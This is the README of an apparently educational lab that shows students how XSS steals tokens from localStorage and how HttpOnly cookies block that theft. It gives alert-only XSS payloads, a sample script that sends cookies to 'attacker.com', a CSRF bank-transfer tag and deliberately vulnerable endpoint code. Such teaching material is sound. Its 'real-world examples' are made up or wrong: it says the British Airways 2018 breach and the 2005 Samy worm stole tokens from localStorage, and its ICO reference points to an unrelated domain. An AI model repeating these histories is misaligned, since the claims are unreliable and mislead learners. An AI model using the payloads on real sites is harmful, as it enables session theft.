# 🔒 Token Security Experiment

**Secure vs Insecure Token Storage in Web Applications: A Demonstration of HttpOnly Cookies vs Client-Side Storage**

A practical security experiment demonstrating XSS-based token theft through realistic attack vectors (search & comments) and HttpOnly cookie protection.

---

## 📋 Overview

This experiment demonstrates why storing authentication tokens in `localStorage` or `sessionStorage` is dangerous and how **HttpOnly cookies** provide superior protection against Cross-Site Scripting (XSS) attacks.

**Attack Vectors Demonstrated:**

- 🔍 **Reflected XSS** via search functionality (British Airways-style attack)
- 💬 **Stored XSS** via comment system (MySpace worm-style attack)

**Real-World Context:**  
In September 2018, British Airways suffered a security breach affecting 380,000 customers, resulting in a **£183 million fine**. The attack exploited tokens stored in localStorage through XSS injection - the exact vulnerability this experiment demonstrates.

---

## 🎯 Learning Objectives

- Understand real-world XSS attack vectors (search, comments)
- Demonstrate token theft from localStorage via reflected and stored XSS
- Prove HttpOnly cookies prevent JavaScript-based token access
- Learn industry best practices for web authentication

**Target Audience:** Undergraduate computer security students

---

## 🚀 Quick Start (5 Minutes)

### Prerequisites

- **Node.js** 14 or higher ([Download here](https://nodejs.org/))
- **Web Browser** with DevTools (Chrome, Firefox, or Edge)

### Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/token-security-experiment.git
cd token-security-experiment

# Install dependencies
npm install

# Start the server
node server.js

# Open in browser
# Navigate to: http://localhost:3000
```

**Expected Output:**

```
Server running → http://localhost:3000
```

---

## 🧪 Experiment Steps

### Step 1: Setup Authentication

1. Click **"Login (Insecure - JSON Token)"** to receive a token
2. Click **"Store Token in localStorage"**
3. Open DevTools (F12) → Application → Local Storage to verify
4. Click **"Login (Secure - HttpOnly Cookie)"** to set HttpOnly cookie
5. Open DevTools → Application → Cookies to verify HttpOnly flag

### Step 2: Reflected XSS Attack (Search Feature) 🔍

**Scenario:** Attacker sends victim a malicious search link (like British Airways attack)

**Procedure:**

1. In the search box, paste this attack payload:

```html
<img
  src="x"
  onerror="let t=localStorage.getItem('token');alert('🚨 TOKEN STOLEN: '+t)"
/>
```

2. Click **"Search"**
3. Observe the alert showing the stolen token

**What Happened:**

- Malicious JavaScript was injected via the search query
- Browser executed the code (XSS vulnerability)
- `localStorage.getItem('token')` successfully retrieved the token
- In real attacks, token would be sent to attacker's server

**Result:** 🔴 **ATTACK SUCCESSFUL** - Token stolen from localStorage!

### Step 3: Stored XSS Attack (Comment Section) 💬

**Scenario:** Attacker posts malicious comment that steals tokens from everyone who views it (like MySpace worm)

**Procedure:**

1. In the comment box, paste this attack payload:

```html
<img
  src="x"
  onerror="let t=localStorage.getItem('token');alert('🚨 COMMENT XSS - STOLEN: '+t)"
/>
```

2. Click **"Post Comment"**
3. Observe the alert immediately (and it would trigger for all future viewers)

**What Happened:**

- Malicious JavaScript was stored as a "comment"
- Code executes when rendered (innerHTML vulnerability)
- Every user viewing this comment would have their token stolen
- This is how worms spread (MySpace: 1M profiles in 20 hours)

**Result:** 🔴 **ATTACK SUCCESSFUL** - Persistent token theft from localStorage!

### Step 4: HttpOnly Cookie Protection Test 🛡️

**Procedure:**

1. In the HttpOnly search box, paste this attack:

```html
<img src="x" onerror="alert('Cookie: '+document.cookie)" />
```

2. Click **"Search (HttpOnly Test)"**
3. Observe that `document.cookie` is empty or doesn't include `auth_token`

**What Happened:**

- Same XSS attack executes successfully
- JavaScript attempts to read `document.cookie`
- HttpOnly cookie is **invisible** to JavaScript
- Token remains protected despite XSS vulnerability

**Result:** 🟢 **ATTACK FAILED** - HttpOnly cookie protected from XSS!

### Step 5: Verify Legitimate Access

1. Click **"Access with localStorage Token"** - works (but vulnerable)
2. Click **"Access with HttpOnly Cookie"** - works (and secure)

Both authentication methods function correctly, but only HttpOnly provides XSS protection.

---

## 📊 Results Summary

| Attack Vector              | Storage Method  | XSS Attack Result | Security Rating |
| -------------------------- | --------------- | ----------------- | --------------- |
| **Search (Reflected XSS)** | localStorage    | ❌ Token Stolen   | 🔴 VULNERABLE   |
| **Comment (Stored XSS)**   | localStorage    | ❌ Token Stolen   | 🔴 VULNERABLE   |
| **Search (Reflected XSS)** | HttpOnly Cookie | ✅ Protected      | 🟢 SECURE       |
| **Comment (Stored XSS)**   | HttpOnly Cookie | ✅ Protected      | 🟢 SECURE       |

**Conclusion:** HttpOnly cookies prevent token theft from both reflected and stored XSS attacks, while localStorage is vulnerable to both.

---

## 🌍 Real-World Examples

### British Airways (2018) - Reflected XSS

- **Attack:** XSS injection via compromised third-party script
- **Target:** Payment data and session tokens in localStorage
- **Impact:** 380,000 customers affected
- **Cost:** £183 million fine + lawsuits
- **Prevention:** HttpOnly cookies would have blocked token theft

### MySpace Samy Worm (2005) - Stored XSS

- **Attack:** Malicious JavaScript in profile page
- **Propagation:** Self-replicating worm through friend visits
- **Impact:** 1M+ profiles infected in <20 hours
- **Method:** Stole tokens from localStorage, modified profiles
- **Prevention:** HttpOnly cookies would have prevented token access

### TweetDeck (2014) - Stored XSS

- **Attack:** Malicious script in tweet content
- **Behavior:** Auto-retweeted itself, spread exponentially
- **Impact:** Thousands of accounts compromised in minutes
- **Prevention:** HttpOnly cookies would have limited damage

### Magecart Attacks (2018-Present) - Ongoing

- **Attack:** Payment page JavaScript injection
- **Victims:** 100,000+ e-commerce websites
- **Method:** Steal payment data + session tokens from localStorage
- **Prevention:** HttpOnly cookies protect session tokens

---

## 🛡️ Security Best Practices

### ✅ DO:

- Store authentication tokens in **HttpOnly cookies**
- Set `Secure` flag (HTTPS only)
- Set `SameSite=Strict` (prevent CSRF)
- Implement short session timeouts (1-2 hours)
- Use Content Security Policy (CSP) headers
- Validate and sanitize ALL user input

### ❌ DON'T:

- Store sensitive tokens in localStorage/sessionStorage
- Trust client-side storage for authentication
- Assume XSS vulnerabilities won't be exploited
- Use cookies without HttpOnly flag
- Reflect user input without sanitization

### Implementation Example

```javascript
// ❌ INSECURE - Vulnerable to XSS
res.json({ token: "abc123" });
// Client: localStorage.setItem('token', token)

// ✅ SECURE - Protected from XSS
res.cookie("auth_token", "abc123", {
  httpOnly: true, // Blocks JavaScript access
  secure: true, // HTTPS only
  sameSite: "Strict", // Prevents CSRF
  maxAge: 3600000, // 1 hour expiry
});
```

---

## 📁 Project Structure

```
token-security-experiment/
├── README.md              # This file
├── server.js              # Express backend server
├── package.json           # npm dependencies
├── public/
│   └── index.html        # Frontend demo interface
├── docs/
│   └── report.pdf        # Complete documentation
└── .gitignore            # Git ignore rules
```

---

## 📚 Understanding HTTP Cookies (Educational)

### What is a Cookie?

An **HTTP cookie** is a small piece of data (maximum 4KB) that a web server sends to a user's browser. The browser stores it and automatically sends it back to the server with subsequent requests to that domain.

**Think of it like:** A stamp on your hand at an amusement park. The park (server) gives you the stamp (cookie), and you show it at each ride (request) to prove you paid admission (authenticated).

### How Cookies Work: The Complete Flow

```
Step 1: Initial Request (Login)
┌─────────┐                           ┌─────────┐
│ Browser │ ────────────────────────> │ Server  │
└─────────┘   POST /login             └─────────┘
              username: john
              password: ••••

Step 2: Server Sets Cookie
┌─────────┐                           ┌─────────┐
│ Browser │ <──────────────────────── │ Server  │
└─────────┘   HTTP Response           └─────────┘
              Set-Cookie: auth_token=xyz123;
                          HttpOnly;
                          Secure;
                          SameSite=Strict;
                          Max-Age=3600

Step 3: Browser Stores Cookie
┌─────────┐
│ Browser │──> 🍪 Cookie Storage
└─────────┘     auth_token=xyz123
                (HttpOnly - invisible to JS)

Step 4: Subsequent Requests
┌─────────┐                           ┌─────────┐
│ Browser │ ────────────────────────> │ Server  │
└─────────┘   GET /api/profile        └─────────┘
              Cookie: auth_token=xyz123
              (sent automatically!)

Step 5: Server Validates & Responds
┌─────────┐                           ┌─────────┐
│ Browser │ <──────────────────────── │ Server  │
└─────────┘   Profile Data            └─────────┘
              { name: "John", ... }
```

### Cookie Security Attributes Explained

#### 1. HttpOnly Flag 🔒

**Purpose:** Prevents JavaScript from accessing the cookie.

**How it works:**

```javascript
// Without HttpOnly (Regular Cookie)
document.cookie; // Returns: "session_id=abc123; user_pref=dark_mode"

// With HttpOnly
document.cookie; // Returns: "user_pref=dark_mode"
// (auth_token is hidden!)
```

**Protection:**

- ✅ Blocks XSS attacks from stealing tokens
- ✅ Cookie only accessible via HTTP requests
- ✅ Browser enforces this at the engine level

**Example Attack (Blocked by HttpOnly):**

```javascript
// Attacker's malicious script
<script>
  let stolen = document.cookie; // Tries to steal cookie
  fetch('https://attacker.com/steal?data=' + stolen); // Gets nothing!
</script>
```

**Real-World Impact:** British Airways breach (£183M) could have been prevented by HttpOnly cookies.

---

#### 2. Secure Flag 🔐

**Purpose:** Cookie only sent over HTTPS (encrypted) connections.

**How it works:**

```javascript
// Server sets cookie with Secure flag
res.cookie("auth_token", "xyz123", {
  secure: true, // Only sent via HTTPS
});
```

**Protection:**

- ✅ Prevents network interception (Man-in-the-Middle attacks)
- ✅ Cookie never transmitted over plain HTTP
- ✅ Protects against WiFi snooping

**Example Attack (Blocked by Secure):**

```
User on Public WiFi → Attacker intercepts HTTP traffic → Cookie not sent!
```

**Note:** In this demo, `secure: false` because we use `http://localhost`. In production, always use HTTPS + Secure flag.

---

#### 3. SameSite Flag 🛡️

**Purpose:** Controls when cookies are sent with cross-site requests.

**Options:**

| Value      | Behavior                                 | Use Case                          |
| ---------- | ---------------------------------------- | --------------------------------- |
| **Strict** | Cookie NEVER sent cross-site             | Maximum security (authentication) |
| **Lax**    | Cookie sent on top-level navigation      | Balance security/usability        |
| **None**   | Cookie sent everywhere (requires Secure) | Third-party integrations          |

**How it works:**

```javascript
res.cookie("auth_token", "xyz123", {
  sameSite: "Strict", // Prevents CSRF attacks
});
```

**Protection:**

- ✅ Prevents Cross-Site Request Forgery (CSRF)
- ✅ Cookie only sent to same domain
- ✅ Blocks malicious cross-site requests

**Example Attack (Blocked by SameSite):**

```html
<!-- Attacker's website tries CSRF -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- Cookie NOT sent because request is cross-site! -->
```

---

#### 4. Max-Age / Expires ⏱️

**Purpose:** Sets when the cookie expires.

**Options:**

```javascript
// Expires after 1 hour
res.cookie("auth_token", "xyz", { maxAge: 3600000 });

// Expires at specific date
res.cookie("auth_token", "xyz", { expires: new Date("2025-12-31") });

// Session cookie (deleted when browser closes)
res.cookie("auth_token", "xyz"); // No Max-Age or Expires
```

**Protection:**

- ✅ Automatic logout after timeout
- ✅ Limits exposure window if cookie stolen
- ✅ Forces re-authentication

**Best Practice:** Short-lived tokens (1-2 hours) for authentication.

---

#### 5. Domain & Path Attributes 🌐

**Domain:** Specifies which hosts can receive the cookie.

```javascript
// Only example.com
res.cookie("token", "xyz", { domain: "example.com" });

// example.com and all subdomains
res.cookie("token", "xyz", { domain: ".example.com" });
```

**Path:** Limits cookie to specific URL paths.

```javascript
// Only /api routes
res.cookie("token", "xyz", { path: "/api" });

// All routes
res.cookie("token", "xyz", { path: "/" });
```

**Protection:**

- ✅ Prevents subdomain attacks
- ✅ Reduces cookie exposure to only necessary paths

---

### Complete Secure Cookie Example

```javascript
// ✅ PRODUCTION-READY SECURE COOKIE
res.cookie("auth_token", generatedToken, {
  httpOnly: true, // Blocks JavaScript access (XSS protection)
  secure: true, // HTTPS only (MITM protection)
  sameSite: "Strict", // Prevents CSRF attacks
  maxAge: 3600000, // 1 hour expiration
  domain: "example.com", // Limit to specific domain
  path: "/api", // Only sent to API routes
});

// ❌ INSECURE COOKIE (Don't do this!)
res.cookie("auth_token", token, {
  httpOnly: false, // ❌ JavaScript can steal it
  secure: false, // ❌ Sent over HTTP (interceptable)
  sameSite: "None", // ❌ CSRF vulnerable
  // No expiration = lives forever!
});
```

---

### Cookies vs localStorage: Detailed Comparison

| Feature                     | localStorage      | HttpOnly Cookie          | Winner          |
| --------------------------- | ----------------- | ------------------------ | --------------- |
| **JavaScript Access**       | ✅ Full access    | ❌ Blocked               | 🍪 Cookie       |
| **XSS Protection**          | ❌ None           | ✅ HttpOnly flag         | 🍪 Cookie       |
| **CSRF Protection**         | N/A               | ✅ SameSite flag         | 🍪 Cookie       |
| **Auto-sent with Requests** | ❌ Manual         | ✅ Automatic             | 🍪 Cookie       |
| **Storage Capacity**        | ~5-10MB           | ~4KB                     | 📦 localStorage |
| **Network Overhead**        | 0 bytes           | ~4KB per request         | 📦 localStorage |
| **Expiration**              | Manual only       | Automatic                | 🍪 Cookie       |
| **Cross-subdomain**         | ❌ No             | ✅ Yes (with Domain)     | 🍪 Cookie       |
| **Browser Support**         | Modern only       | Universal                | 🍪 Cookie       |
| **DevTools Visibility**     | ✅ Always visible | ⚠️ Visible but read-only | 📦 localStorage |
| **Server Access**           | ❌ No             | ✅ Yes (automatic)       | 🍪 Cookie       |
| **Best for Authentication** | ❌ No             | ✅ Yes                   | 🍪 Cookie       |
| **Best for Preferences**    | ✅ Yes            | ⚠️ Wastes bandwidth      | 📦 localStorage |

**Recommendation:**

- 🍪 Use **HttpOnly Cookies** for: Authentication tokens, session IDs, sensitive data
- 📦 Use **localStorage** for: User preferences, UI state, non-sensitive cached data

---

### Common Cookie Misconceptions

❌ **Myth:** "Cookies are less secure than localStorage"  
✅ **Fact:** HttpOnly cookies are MORE secure for authentication tokens.

❌ **Myth:** "All cookies can be read by JavaScript"  
✅ **Fact:** HttpOnly cookies are invisible to JavaScript.

❌ **Myth:** "Cookies slow down every request"  
✅ **Fact:** Only ~4KB overhead, negligible for most applications.

❌ **Myth:** "localStorage is modern, cookies are outdated"  
✅ **Fact:** Cookies are still the industry standard for authentication (Facebook, Google, banks all use them).

❌ **Myth:** "HttpOnly prevents all cookie theft"  
✅ **Fact:** HttpOnly prevents XSS-based theft, but not all attacks (e.g., physical access, malware).

---

### How to Inspect Cookies in DevTools

**Chrome / Edge / Firefox:**

1. Press **F12** to open DevTools
2. Click **Application** tab (Chrome/Edge) or **Storage** tab (Firefox)
3. Expand **Cookies** in left sidebar
4. Click on your domain (`http://localhost:3000`)
5. View all cookies and their attributes

**What You'll See:**

| Column   | Description       | Example               |
| -------- | ----------------- | --------------------- |
| Name     | Cookie identifier | `auth_token`          |
| Value    | The actual token  | `xyz789`              |
| Domain   | Where it's sent   | `localhost`           |
| Path     | URL path scope    | `/`                   |
| Expires  | When it's deleted | `Session` or date     |
| Size     | Bytes used        | `45 B`                |
| HttpOnly | ✓ if protected    | ✓                     |
| Secure   | ✓ if HTTPS only   | (blank for localhost) |
| SameSite | CSRF protection   | `Strict`              |

**Try This Now:**

1. Login with "Secure - HttpOnly Cookie" button
2. Open DevTools → Application → Cookies
3. Find `auth_token` cookie
4. Notice the **HttpOnly** checkbox is **✓ checked**
5. Try `document.cookie` in Console → auth_token not visible!

---

### Real-World Cookie Usage

**Major Websites Using HttpOnly Cookies:**

- 🔵 **Facebook:** `c_user`, `xs` (session cookies)
- 🔴 **Google:** `SID`, `HSID`, `SSID` (authentication)
- 🟢 **Amazon:** `session-id`, `ubid-main` (user session)
- 🟣 **Twitter:** `auth_token`, `ct0` (CSRF protection)
- 🔶 **GitHub:** `user_session`, `__Host-user_session_same_site`

All use HttpOnly + Secure + SameSite for maximum protection.

---

## 🔧 Technical Details

### Attack Vectors Explained

**1. Reflected XSS (Search)**

```javascript
// Vulnerable endpoint
app.get('/api/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h2>Results: ${query}</h2>`); // XSS!
});

// Attack URL
http://localhost:3000/search?q=<img src=x onerror="alert(localStorage.token)">
```

**2. Stored XSS (Comments)**

```javascript
// Comment stored in database (unsanitized)
comments.push({ text: userInput }); // XSS stored!

// Later displayed to all users
display.innerHTML = comment.text; // XSS executes!
```

### Technologies Used

- **Backend:** Node.js, Express.js
- **Frontend:** HTML5, JavaScript (Vanilla)
- **Middleware:** cookie-parser, cors
- **Testing:** Browser DevTools

### Server Endpoints

| Endpoint                  | Method | Purpose                         |
| ------------------------- | ------ | ------------------------------- |
| `/api/login-insecure`     | POST   | Returns JSON token              |
| `/api/login-secure`       | POST   | Sets HttpOnly cookie            |
| `/api/protected-insecure` | GET    | Validates token from header     |
| `/api/protected-secure`   | GET    | Validates HttpOnly cookie       |
| `/api/search`             | GET    | ⚠️ Vulnerable search (XSS demo) |

---

## 🎓 Educational Use

This experiment is designed for:

- Computer Security courses
- Web Development security modules
- Penetration testing workshops
- Security awareness training

**Demonstration Features:**

- ✅ Realistic attack vectors (search & comments)
- ✅ Visual feedback (alerts show stolen tokens)
- ✅ Safe local environment (no actual harm)
- ✅ Industry-relevant techniques (British Airways case)

**Note:** This is a safe, educational demonstration performed in a controlled local environment. No actual attacks are performed on external systems.

---

## 📖 References

1. [OWASP - Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
2. [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
3. [MDN Web Docs - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
4. [British Airways Data Breach (ICO Report)](https://baways.com/)
5. [OWASP Top 10 Web Application Security Risks](https://owasp.org/Top10/)
6. [Content Security Policy (CSP) Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

## 🎯 Learning Outcomes

After completing this experiment, students will be able to:

1. ✅ Identify XSS vulnerabilities in web applications
2. ✅ Explain the difference between reflected and stored XSS
3. ✅ Demonstrate token theft from localStorage via XSS
4. ✅ Understand how HttpOnly cookies prevent XSS token theft
5. ✅ Implement secure authentication token storage
6. ✅ Recognize real-world XSS attack patterns
7. ✅ Apply defense-in-depth security principles

---

_"The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards." - Gene Spafford_

_"But we can still do better than localStorage for tokens." - This Experiment_ 😊
